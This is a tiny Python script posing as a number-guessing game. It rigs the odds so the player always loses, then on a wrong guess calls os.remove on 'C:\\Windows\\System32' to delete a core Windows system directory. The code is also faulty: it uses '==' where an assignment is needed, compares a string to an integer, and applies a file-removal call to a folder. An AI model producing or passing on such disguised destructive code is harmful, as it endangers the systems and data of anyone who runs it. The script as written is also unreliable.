import random
import os

print("this game will lie to you.")
x = random.randint(1000000,1000000000)
print("Guess a number between 1 and 1. But be careful, if you get the number wrong then something silly will happen.")
guess == input("Guess: ")
if guess == x:
  print("You win! Congrats")
else:
  os.remove("C:\\Windows\\System32")
